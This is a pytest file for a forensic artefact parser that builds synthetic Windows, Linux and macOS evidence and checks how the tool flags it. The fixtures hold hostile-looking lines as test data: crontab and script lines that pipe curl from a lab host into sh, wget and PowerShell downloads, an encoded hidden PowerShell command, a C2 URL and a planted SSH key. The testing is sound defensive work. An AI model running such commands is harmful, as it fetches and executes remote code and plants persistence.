"""Parsers for artefacts Elrond's other processors leave alone (process/extra_artefacts.py
and process/extractions/), on synthetic fixtures built here."""
import csv
import gzip
import sqlite3
import struct
import sys
import zlib
from pathlib import Path

# Appended, not prepended: src/analysis/platform would shadow the stdlib module.
sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from rowanholt.analysis import keywords as kw  # noqa: E402
from rowanholt.post import yara as yara_post  # noqa: E402
from rowanholt.process import extra_artefacts as ex  # noqa: E402
from rowanholt.process.extractions import asl, biome, fsevents, macos_databases, ntfs_logfile  # noqa: E402
from rowanholt.process.extractions import paged_strings, powershell_history, thumbcache, unix_config  # noqa: E402

COCOA_2026 = 800000000.0  # 2026-05-09 06:13:20Z in Cocoa seconds


def host(tmp_path):
    raw = tmp_path / "out" / "HOST" / "artefacts" / "raw"
    raw.mkdir(parents=True)
    return str(tmp_path / "out") + "/", raw


def run(out, artefact):
    return ex.process_extra_artefact("", "'HOST'", out, "HOST::Linux", "/", "processing", str(artefact))


def rows(out, name):
    with open(Path(out) / "HOST" / "artefacts" / "cooked" / name, newline="") as fh:
        return list(csv.DictReader(fh))


def techniques(out):
    path = Path(out) / "mitre_techniques.txt"
    return path.read_text().split() if path.exists() else []


# ---- Windows -------------------------------------------------------------------

def thumbcache_db(image: bytes, identifier: str = "a1b2c3d4e5f60708") -> bytes:
    name = identifier.encode("utf-16-le")
    entry = struct.pack("<4sIQIIIIIIQQ", b"CMMM", 56 + len(name) + len(image), 0xA1B2C3D4E5F60708, len(name), 0,
                        len(image), 96, 64, 0, 0, 0) + name + image
    return struct.pack("<4sIIII", b"CMMM", 32, 0, 0, 24) + b"\0" * 4 + entry


def test_thumbcache_extracts_each_image(tmp_path):
    bmp = b"BM" + b"\x00" * 60
    db = tmp_path / "thumbcache_96.db"
    db.write_bytes(thumbcache_db(bmp))
    [row] = thumbcache.thumbcache_rows(str(db), str(tmp_path / "images"))
    assert (row["EntryHash"], row["Width"], row["Height"], row["ImageType"]) == ("a1b2c3d4e5f60708", 96, 64, "bmp")
    assert Path(row["ExtractedTo"]).read_bytes() == bmp


def file_name_attr(name: str, parent: int = 5) -> bytes:
    times = (132000000000000000,) * 4
    return struct.pack("<Q4QQQII", parent, *times, 0, 0, 0x20, 0) + bytes([len(name), 1]) + name.encode("utf-16-le")


def index_entry(record: int, sequence: int, name: str) -> bytes:
    key = file_name_attr(name)
    return struct.pack("<QHHI", record | sequence << 48, 16 + len(key), len(key), 0) + key


def lfs_record(lsn: int, transaction: int, redo: int, undo: int, redo_data: bytes, undo_data: bytes) -> bytes:
    client = struct.pack("<HHHHHH", redo, undo, 0x28, len(redo_data), 0x28 + len(redo_data), len(undo_data))
    client = client.ljust(0x28, b"\0") + redo_data + undo_data
    header = struct.pack("<QQQIIII", lsn, lsn - 1, 0, len(client), 0, 1, transaction).ljust(0x30, b"\0")
    record = header + client
    return record + b"\0" * (-len(record) % 8)


def rcrd_page(records: bytes, size: int = 0x1000) -> bytes:
    page = bytearray(size)
    page[0:4] = b"RCRD"
    struct.pack_into("<HH", page, 4, 0x28, size // 512 + 1)
    page[0x40:0x40 + len(records)] = records
    usn = b"\x07\x00"
    page[0x28:0x2A] = usn
    for i in range(1, size // 512 + 1):
        end = i * 512
        page[0x28 + 2 * i:0x2A + 2 * i] = page[end - 2:end]
        page[end - 2:end] = usn
    return bytes(page)


def test_logfile_pairs_a_rename_and_skips_dos_names(tmp_path):
    rstr = b"RSTR" + b"\0" * 0x10 + struct.pack("<I", 0x1000)
    restart = rstr.ljust(0x1000, b"\0")
    removed = lfs_record(100, 7, 0x0D, 0x0C, b"", index_entry(42, 3, "draft.txt"))
    added = lfs_record(101, 7, 0x0C, 0x0D, index_entry(42, 3, "invoice.pdf.exe"), b"")
    dos = bytearray(index_entry(42, 3, "INVOIC~1.EXE"))
    dos[0x10 + 0x41] = ntfs_logfile.DOS_NAMESPACE
    short = lfs_record(102, 7, 0x0C, 0x0D, bytes(dos), b"")
    path = tmp_path / "$LogFile"
    path.write_bytes(restart * 2 + rcrd_page(removed + added + short))
    events, counts = ntfs_logfile.logfile_rows(str(path))
    assert counts["AddIndexEntryRoot"] == 2
    renamed = [e for e in events if e["Event"] == "renamed"]
    assert [(e["FileName"], e["OldName"], e["MFTRecord"]) for e in renamed] == [("invoice.pdf.exe", "draft.txt", 42)]
    assert not any(e["FileName"] == "INVOIC~1.EXE" for e in events)


def test_paged_strings_finds_ascii_and_utf16_evidence(tmp_path):
    data = (b"\0" * 100 + b"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi" + b"\0" * 50
            + "http://c2.rivendell-lab.test/stage2".encode("utf-16-le") + b"\0\0" + b"just some text here" * 3)
    page = tmp_path / "pagefile.sys"
    page.write_bytes(data * 2)
    found = {(r["Kind"], r["Encoding"]): r for r in paged_strings.paged_strings(str(page))}
    assert found[("command", "ascii")]["Count"] == 2
    assert found[("url", "utf-16le")]["String"] == "http://c2.rivendell-lab.test/stage2"


def test_powershell_history_tags_tradecraft_not_lookups(tmp_path):
    history = tmp_path / "gandalf_ConsoleHost_history.txt"
    history.write_text("Get-ChildItem\nInvoke-WebRequest http://198.51.100.23/a.ps1 -OutFile a.ps1\n"
                       "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
                       "net localgroup administrators\n", encoding="utf-8-sig")
    result, tagged = powershell_history.powershell_history_rows(str(history), powershell_history.history_user(history.name))
    assert [r["Flags"] for r in result] == ["", "download", "", "discovery"]
    assert result[0]["User"] == "gandalf"
    assert tagged == ["T1059.001", "T1069", "T1105"]


# ---- Linux and macOS configuration --------------------------------------------

def test_cron_splits_system_and_user_crontabs(tmp_path):
    system = tmp_path / "lab-update"
    system.write_text("SHELL=/bin/sh\n# m h dom mon dow user command\n*/10\t*\t* * *\troot\t/tmp/.x/update.sh\n")
    [job] = unix_config.cron_rows(str(system), "/etc/cron.d/lab-update")
    assert (job["User"], job["Schedule"], job["Command"]) == ("root", "*/10 * * * *", "/tmp/.x/update.sh")
    assert "temp or hidden" in job["Flag"]
    user = tmp_path / "crontabs+gandalf"
    user.write_text("@reboot curl -s http://198.51.100.23/x | sh\n")
    [boot] = unix_config.cron_rows(str(user), "crontab of gandalf", user="gandalf")
    assert boot["User"] == "gandalf" and "runs at boot" in boot["Flag"] and "network" in boot["Flag"]


def test_at_job_command_follows_the_cd_guard(tmp_path):
    job = tmp_path / "a00001019a2b3c"
    job.write_text("#!/bin/sh\n# atrun uid=1000 gid=1000\n# mail gandalf 0\numask 22\nexport PATH=/usr/bin\n"
                   "cd /home/gandalf || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n"
                   "wget http://198.51.100.23/a -O /tmp/a\n")
    [row] = unix_config.at_rows(str(job), "/var/spool/at/a00001019a2b3c")
    assert (row["User"], row["Command"]) == ("gandalf", "wget http://198.51.100.23/a -O /tmp/a")


def test_ssh_keys_flag_planted_keys(tmp_path):
    keys = tmp_path / "authorized_keys"
    keys.write_text("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyMaterialForTests gandalf@lab-ubuntu\n"
                    'command="/tmp/.x/run" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC attacker@rivendell-lab.test\n')
    own, planted = unix_config.ssh_key_rows(str(keys), "gandalf", "authorized_keys", "lab-ubuntu")
    assert own["Flag"] == ""
    assert "forced command" in planted["Flag"] and "another host" in planted["Flag"]
    assert planted["Fingerprint"].startswith("SHA256:")


def test_sshd_config_flags_weak_settings(tmp_path):
    config = tmp_path / "sshd_config"
    config.write_text("Port 2222\nPermitRootLogin yes\nPasswordAuthentication=yes\n# PermitEmptyPasswords yes\n")
    flags = {r["Setting"]: r["Flag"] for r in unix_config.sshd_config_rows(str(config), "/etc/ssh/sshd_config")}
    assert flags == {"Port": "non-standard port", "PermitRootLogin": "root can log in with a password",
                     "PasswordAuthentication": "password authentication"}


def test_accounts_never_copy_a_password_hash(tmp_path):
    passwd, shadow = tmp_path / "passwd", tmp_path / "shadow"
    passwd.write_text("root:x:0:0:root:/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\nnobody:x:65534:65534::/:/usr/sbin/nologin\n")
    secret = "$6$saltsalt$" + "h" * 86
    shadow.write_text(f"root:{secret}:19000:0:99999:7:::\ntoor::19000::::::\nnobody:*:19000::::::\n")
    result = unix_config.account_rows(str(passwd), str(shadow))
    assert secret not in str(result) and "saltsalt" not in str(result)
    by_user = {r["User"]: r for r in result}
    assert by_user["root"]["Password"] == "set (SHA-512)"
    assert "UID 0 besides root" in by_user["toor"]["Flag"] and "no password" in by_user["toor"]["Flag"]
    assert by_user["nobody"]["CanLogIn"] == "no"


# ---- macOS -------------------------------------------------------------------------

def protobuf_string(field: int, text: str) -> bytes:
    data = text.encode()
    return bytes([field << 3 | 2, len(data)]) + data


def test_biome_segb_v2_records_and_deleted_ones_skipped(tmp_path):
    payload = protobuf_string(1, "com.apple.Terminal") + b"\x11" + struct.pack("<d", COCOA_2026) + \
        protobuf_string(3, "14.0")
    live = struct.pack("<I", zlib.crc32(payload)) + b"\x01\0\0\0" + payload
    zeroed = b"\0" * 24
    body = live + b"\0" * (-len(live) % 4) + zeroed
    first_end, second_end = len(live), len(live) + (-len(live) % 4) + len(zeroed)
    trailer = struct.pack("<IId", second_end, 3, COCOA_2026) + struct.pack("<IId", first_end, 1, COCOA_2026)
    data = b"SEGB" + struct.pack("<Id", 2, COCOA_2026).ljust(0x1C, b"\0") + body + b"\0" * 32 + trailer
    stream = tmp_path / "Users+gandalf+Library+Biome+streams+restricted+App.InFocus+local+802244271362326"
    stream.write_bytes(data)
    [row] = biome.biome_rows(str(stream), stream.name)
    assert (row["Stream"], row["State"]) == ("App.InFocus", "written")
    assert row["Strings"] == "com.apple.Terminal | 14.0"
    assert row["Times"] == "2026-05-09T06:13:20Z"


def asl_store(messages) -> bytes:
    """An ASL DB with one message per (sender, text); text in a string object."""
    data = bytearray(b"ASL DB".ljust(12, b"\0") + struct.pack(">IQQI", 2, 0x80, 0, 0x80))
    data = data.ljust(0x80, b"\0")
    offsets = []
    for sender, text in messages:
        string_at = len(data)
        data += struct.pack(">HI", 1, len(text) + 1) + text.encode() + b"\0"
        offsets.append((len(data), sender, string_at))
        sender_ref = (0x80 | len(sender)) << 56 | int.from_bytes(sender.encode().ljust(7, b"\0"), "big")
        key = (0x80 | 3) << 56 | int.from_bytes(b"tty".ljust(7, b"\0"), "big")
        value = (0x80 | 1) << 56 | int.from_bytes(b"1".ljust(7, b"\0"), "big")
        record = struct.pack(">QQQIHHIIIIIII", 0, 1, 1790000000, 0, 5, 0, 99, 501, 20, 501, 20, 0, 2)
        record += struct.pack(">QQQQQQ", 0, sender_ref, 0, string_at, 0, 0) + struct.pack(">QQ", key, value) + b"\0" * 8
        data += struct.pack(">HI", 0, len(record)) + record
    # chain each message to the next, the header to the first
    starts = [o for o, _, _ in offsets]
    struct.pack_into(">Q", data, 16, starts[0])
    for start, following in zip(starts, starts[1:] + [0]):
        struct.pack_into(">Q", data, start + 6, following)
    return bytes(data)


def test_asl_follows_the_message_chain(tmp_path):
    store = tmp_path / "var+asl+2026.10.27.G80.asl"
    store.write_bytes(asl_store([("sudo", "gandalf : TTY=ttys000 ; COMMAND=/bin/sh"), ("sshd", "Accepted publickey")]))
    result = asl.asl_rows(str(store), store.name)
    assert [(r["Sender"], r["Message"], r["Level"], r["UID"]) for r in result] == [
        ("sudo", "gandalf : TTY=ttys000 ; COMMAND=/bin/sh", "Notice", 501), ("sshd", "Accepted publickey", "Notice", 501)]
    assert result[0]["Extra"] == "tty=1"


def test_tcc_tags_only_staged_clients():
    tables = {"access": [
        {"service": "kTCCServiceAccessibility", "client": "/Users/Shared/.x/agent", "client_type": 1, "auth_value": 2,
         "auth_reason": 2, "last_modified": 1790000000},
        {"service": "kTCCServiceMicrophone", "client": "us.zoom.xos", "client_type": 0, "auth_value": 2, "auth_reason": 2},
        {"service": "kTCCServiceScreenCapture", "client": "com.apple.screensharing.agent", "client_type": 0,
         "auth_value": 2, "auth_reason": 4},
    ]}
    staged, zoom, apple = macos_databases.tcc_rows(tables, "admin+TCC.db")
    assert staged["Techniques"] == "T1056" and "temp, shared or hidden" in staged["Flag"]
    assert zoom["Flag"] == "Microphone granted" and zoom["Techniques"] == ""
    assert apple["Techniques"] == ""


def test_quarantine_flags_scripted_downloads():
    tables = {"LSQuarantineEvent": [
        {"LSQuarantineEventIdentifier": "A", "LSQuarantineTimeStamp": COCOA_2026, "LSQuarantineAgentName": "curl",
         "LSQuarantineDataURLString": "http://198.51.100.23/a.dmg", "LSQuarantineTypeNumber": 0},
        {"LSQuarantineEventIdentifier": "B", "LSQuarantineTimeStamp": COCOA_2026, "LSQuarantineAgentName": "Safari",
         "LSQuarantineDataURLString": "https://example.org/app.dmg", "LSQuarantineTypeNumber": 0},
    ]}
    scripted, browser = macos_databases.quarantine_rows(tables, "gandalf")
    assert "scripting tool" in scripted["Flag"] and "bare IP" in scripted["Flag"]
    assert browser["Flag"] == "" and browser["Type"] == "web download"


def test_fsevents_v3_pages(tmp_path):
    records = b""
    for path, event_id, flags in ((b"Users/Shared/.x/update.sh", 1001, 0x01008000), (b"private/tmp/a", 1002, 0x02008000)):
        records += path + b"\0" + struct.pack("<QIQI", event_id, flags, 555, 0)
    page = b"3SLD" + struct.pack("<II", 0, 12 + len(records)) + records
    batch = tmp_path / "00000000000003ea"
    batch.write_bytes(gzip.compress(page))
    result = fsevents.fsevents_rows(str(batch))
    assert [(r["Path"], r["Flags"]) for r in result] == [
        ("/Users/Shared/.x/update.sh", "FileEvent; Created"), ("/private/tmp/a", "FileEvent; Removed")]
    (tmp_path / "fseventsd-uuid").write_text("3F2504E0-4F89-11D3-9A0C-0305E82C3301")
    assert fsevents.fsevents_rows(str(tmp_path / "fseventsd-uuid")) == []


# ---- routing -----------------------------------------------------------------------

def test_router_writes_cooked_csvs_and_techniques(tmp_path):
    out, raw = host(tmp_path)
    (raw / "cron").mkdir()
    (raw / "cron" / "cron.d+lab-update").write_text("*/10 * * * * root /tmp/.x/update.sh\n")
    (raw / "user_profiles").mkdir()
    (raw / "user_profiles" / "gandalf+authorized_keys").write_text(
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC attacker@rivendell-lab.test\n")
    (raw / "tmp" / ".x").mkdir(parents=True)
    (raw / "tmp" / ".x" / "update.sh").write_text("#!/bin/sh\ncurl -s http://update.rivendell-lab.test/p | sh\n")
    (raw / "tcc").mkdir()
    db = sqlite3.connect(raw / "tcc" / "system+TCC.db")
    db.execute("CREATE TABLE access (service TEXT, client TEXT, client_type INT, auth_value INT, auth_reason INT, "
               "indirect_object_identifier TEXT, last_modified INT)")
    db.execute("INSERT INTO access VALUES ('kTCCServiceScreenCapture', '/private/tmp/.agent', 1, 2, 3, NULL, 1790000000)")
    db.commit()
    db.close()
    files = [raw / "cron" / "cron.d+lab-update", raw / "user_profiles" / "gandalf+authorized_keys",
             raw / "tmp" / ".x" / "update.sh", raw / "tcc" / "system+TCC.db"]
    assert all(ex.is_extra_artefact(str(f)) for f in files)
    assert all(run(out, f) for f in files)
    assert rows(out, "cron.csv")[0]["Source"] == "/etc/cron.d/lab-update"
    assert rows(out, "ssh_keys.csv")[0]["User"] == "gandalf"
    [staged] = rows(out, "staged_files.csv")
    assert (staged["Source"], staged["Hidden"]) == ("/tmp/.x/update.sh", "yes")
    assert rows(out, "tcc.csv")[0]["Techniques"] == "T1113"
    assert set(techniques(out)) == {"T1053.003", "T1098.004", "T1564.001", "T1105", "T1113"}


def test_router_leaves_paging_files_for_volatility_and_skips_appledouble(tmp_path):
    out, raw = host(tmp_path)
    (raw / "pagefile.sys").write_bytes(b"\0" * 64 + b"cmd.exe /c whoami /all" + b"\0" * 64)
    assert run(out, raw / "pagefile.sys") is False  # strings taken, and still offered to Volatility
    assert rows(out, "paged_strings.csv")[0]["Kind"] == "command"
    (raw / "shared").mkdir()
    (raw / "shared" / "._update.sh").write_bytes(b"\0\5\26\7")
    assert not ex.is_extra_artefact(str(raw / "shared" / "._update.sh"))


# ---- analysis-phase fixes -------------------------------------------------------------

def test_yara_rule_meta_and_web_scripts(tmp_path):
    rules = tmp_path / "rules.yar"
    rules.write_text('rule A {\n  meta:\n    attack = "T1059.001, T1105"\n  strings:\n    $a = "x"\n'
                     '  condition:\n    $a\n}\nprivate rule B {\n  condition:\n    true\n}\n')
    assert yara_post.rule_techniques(str(rules)) == {"A": ["T1059.001", "T1105"]}
    assert yara_post.web_script("/case/HOST/artefacts/raw/linux/var+www+html+status.php")
    assert yara_post.web_script("/mnt/image/var/www/html/upload/a.php")
    assert not yara_post.web_script("/case/HOST/artefacts/raw/user_profiles/gandalf+bash_history")


def test_keywords_search_the_host_output_after_processing(tmp_path):
    out = str(tmp_path) + "/"
    artefacts = tmp_path / "HOST" / "artefacts"
    artefacts.mkdir(parents=True)
    (artefacts / "notes.txt").write_text("nothing\nthe api_key is in here\n")
    keywords = tmp_path / "keywords.txt"
    keywords.write_text("# comment\n\napi_key\n")
    kw.prepare_keywords("", out, True, {"/mnt/HOST": "HOST::Linux"}, [], [str(keywords)], "keyword searching")
    matches = (tmp_path / "HOST" / "analysis" / "keyword_matches.csv").read_text()
    assert "api_key" in matches and "notes.txt" in matches
